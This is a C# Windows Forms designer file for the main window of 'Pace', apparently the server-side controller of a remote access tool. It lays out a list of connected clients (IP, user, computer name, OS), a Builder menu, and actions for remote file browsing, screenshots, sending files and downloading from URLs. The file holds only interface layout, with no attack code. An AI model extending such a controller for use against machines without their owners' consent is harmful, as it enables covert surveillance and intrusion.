namespace Pace.Server.Forms
{
    partial class MainForm
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
            this.mainMenuStrip = new System.Windows.Forms.MenuStrip();
            this.fileMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.exitMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.builderMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.settingsMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aboutMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.contextMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.managementMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.fileExplorerMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.surveillanceMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.takeScreenshotMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolsMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.sendFileMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.downloadFromURLMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clientListview = new System.Windows.Forms.ListView();
            this.idHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.addressHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.portHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.userNameHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.computerNameHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.operatingSystemHeader = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.mainMenuStrip.SuspendLayout();
            this.contextMenu.SuspendLayout();
            this.SuspendLayout();
            // 
            // mainMenuStrip
            // 
            this.mainMenuStrip.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fileMenuItem,
            this.builderMenuItem,
            this.settingsMenuItem,
            this.aboutMenuItem});
            this.mainMenuStrip.Location = new System.Drawing.Point(0, 0);
            this.mainMenuStrip.Name = "mainMenuStrip";
            this.mainMenuStrip.Size = new System.Drawing.Size(800, 24);
            this.mainMenuStrip.TabIndex = 0;
            // 
            // fileMenuItem
            // 
            this.fileMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.exitMenuItem});
            this.fileMenuItem.Name = "fileMenuItem";
            this.fileMenuItem.Size = new System.Drawing.Size(37, 20);
            this.fileMenuItem.Text = "File";
            // 
            // exitMenuItem
            // 
            this.exitMenuItem.Name = "exitMenuItem";
            this.exitMenuItem.Size = new System.Drawing.Size(92, 22);
            this.exitMenuItem.Text = "Exit";
            this.exitMenuItem.Click += new System.EventHandler(this.exitMenuItem_Click);
            // 
            // builderMenuItem
            // 
            this.builderMenuItem.Name = "builderMenuItem";
            this.builderMenuItem.Size = new System.Drawing.Size(56, 20);
            this.builderMenuItem.Text = "Builder";
            // 
            // settingsMenuItem
            // 
            this.settingsMenuItem.Name = "settingsMenuItem";
            this.settingsMenuItem.Size = new System.Drawing.Size(61, 20);
            this.settingsMenuItem.Text = "Settings";
            // 
            // aboutMenuItem
            // 
            this.aboutMenuItem.Name = "aboutMenuItem";
            this.aboutMenuItem.Size = new System.Drawing.Size(52, 20);
            this.aboutMenuItem.Text = "About";
            // 
            // contextMenu
            // 
            this.contextMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.managementMenuItem,
            this.surveillanceMenuItem,
            this.toolsMenuItem});
            this.contextMenu.Name = "contextMenu";
            this.contextMenu.Size = new System.Drawing.Size(146, 70);
            this.contextMenu.Opening += new System.ComponentModel.CancelEventHandler(this.contextMenu_Opening);
            // 
            // managementMenuItem
            // 
            this.managementMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fileExplorerMenuItem});
            this.managementMenuItem.Image = global::Pace.Server.Properties.Resources.monitor;
            this.managementMenuItem.Name = "managementMenuItem";
            this.managementMenuItem.Size = new System.Drawing.Size(145, 22);
            this.managementMenuItem.Text = "Management";
            // 
            // fileExplorerMenuItem
            // 
            this.fileExplorerMenuItem.Image = global::Pace.Server.Properties.Resources.folder_explore;
            this.fileExplorerMenuItem.Name = "fileExplorerMenuItem";
            this.fileExplorerMenuItem.Size = new System.Drawing.Size(146, 22);
            this.fileExplorerMenuItem.Text = "File Explorer...";
            this.fileExplorerMenuItem.Click += new System.EventHandler(this.fileExplorerMenuItem_Click);
            // 
            // surveillanceMenuItem
            // 
            this.surveillanceMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.takeScreenshotMenuItem});
            this.surveillanceMenuItem.Image = global::Pace.Server.Properties.Resources.eye;
            this.surveillanceMenuItem.Name = "surveillanceMenuItem";
            this.surveillanceMenuItem.Size = new System.Drawing.Size(145, 22);
            this.surveillanceMenuItem.Text = "Surveillance";
            // 
            // takeScreenshotMenuItem
            // 
            this.takeScreenshotMenuItem.Image = global::Pace.Server.Properties.Resources.camera;
            this.takeScreenshotMenuItem.Name = "takeScreenshotMenuItem";
            this.takeScreenshotMenuItem.Size = new System.Drawing.Size(159, 22);
            this.takeScreenshotMenuItem.Text = "Take Screenshot";
            this.takeScreenshotMenuItem.Click += new System.EventHandler(this.takeScreenshotMenuItem_Click);
            // 
            // toolsMenuItem
            // 
            this.toolsMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sendFileMenuItem,
            this.downloadFromURLMenuItem});
            this.toolsMenuItem.Image = global::Pace.Server.Properties.Resources.wrench;
            this.toolsMenuItem.Name = "toolsMenuItem";
            this.toolsMenuItem.Size = new System.Drawing.Size(145, 22);
            this.toolsMenuItem.Text = "Tools";
            // 
            // sendFileMenuItem
            // 
            this.sendFileMenuItem.Image = global::Pace.Server.Properties.Resources.page_go;
            this.sendFileMenuItem.Name = "sendFileMenuItem";
            this.sendFileMenuItem.Size = new System.Drawing.Size(190, 22);
            this.sendFileMenuItem.Text = "Send File...";
            this.sendFileMenuItem.Click += new System.EventHandler(this.sendFileMenuItem_Click);
            // 
            // downloadFromURLMenuItem
            // 
            this.downloadFromURLMenuItem.Image = global::Pace.Server.Properties.Resources.world_link;
            this.downloadFromURLMenuItem.Name = "downloadFromURLMenuItem";
            this.downloadFromURLMenuItem.Size = new System.Drawing.Size(190, 22);
            this.downloadFromURLMenuItem.Text = "Download from URL...";
            this.downloadFromURLMenuItem.Click += new System.EventHandler(this.downloadFromURLMenuItem_Click);
            // 
            // clientListview
            // 
            this.clientListview.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.idHeader,
            this.addressHeader,
            this.portHeader,
            this.userNameHeader,
            this.computerNameHeader,
            this.operatingSystemHeader});
            this.clientListview.ContextMenuStrip = this.contextMenu;
            this.clientListview.Dock = System.Windows.Forms.DockStyle.Fill;
            this.clientListview.FullRowSelect = true;
            this.clientListview.Location = new System.Drawing.Point(0, 24);
            this.clientListview.MultiSelect = false;
            this.clientListview.Name = "clientListview";
            this.clientListview.Size = new System.Drawing.Size(800, 426);
            this.clientListview.TabIndex = 1;
            this.clientListview.UseCompatibleStateImageBehavior = false;
            this.clientListview.View = System.Windows.Forms.View.Details;
            // 
            // idHeader
            // 
            this.idHeader.Text = "Identifier";
            // 
            // addressHeader
            // 
            this.addressHeader.Text = "IP Address";
            // 
            // portHeader
            // 
            this.portHeader.Text = "Port";
            // 
            // userNameHeader
            // 
            this.userNameHeader.Text = "User";
            // 
            // computerNameHeader
            // 
            this.computerNameHeader.Text = "Computer Name";
            // 
            // operatingSystemHeader
            // 
            this.operatingSystemHeader.Text = "Operating System";
            // 
            // MainForm
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(800, 450);
            this.Controls.Add(this.clientListview);
            this.Controls.Add(this.mainMenuStrip);
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MainMenuStrip = this.mainMenuStrip;
            this.Name = "MainForm";
            this.Text = "Pace";
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.MainForm_FormClosed);
            this.Load += new System.EventHandler(this.MainForm_Load);
            this.mainMenuStrip.ResumeLayout(false);
            this.mainMenuStrip.PerformLayout();
            this.contextMenu.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.MenuStrip mainMenuStrip;
        private System.Windows.Forms.ToolStripMenuItem fileMenuItem;
        private System.Windows.Forms.ToolStripMenuItem builderMenuItem;
        private System.Windows.Forms.ToolStripMenuItem exitMenuItem;
        private System.Windows.Forms.ContextMenuStrip contextMenu;
        private System.Windows.Forms.ToolStripMenuItem settingsMenuItem;
        private System.Windows.Forms.ToolStripMenuItem aboutMenuItem;
        private System.Windows.Forms.ListView clientListview;
        private System.Windows.Forms.ColumnHeader idHeader;
        private System.Windows.Forms.ColumnHeader addressHeader;
        private System.Windows.Forms.ColumnHeader userNameHeader;
        private System.Windows.Forms.ColumnHeader operatingSystemHeader;
        private System.Windows.Forms.ColumnHeader computerNameHeader;
        private System.Windows.Forms.ColumnHeader portHeader;
        private System.Windows.Forms.ToolStripMenuItem managementMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fileExplorerMenuItem;
        private System.Windows.Forms.ToolStripMenuItem surveillanceMenuItem;
        private System.Windows.Forms.ToolStripMenuItem takeScreenshotMenuItem;
        private System.Windows.Forms.ToolStripMenuItem toolsMenuItem;
        private System.Windows.Forms.ToolStripMenuItem downloadFromURLMenuItem;
        private System.Windows.Forms.ToolStripMenuItem sendFileMenuItem;
    }
}

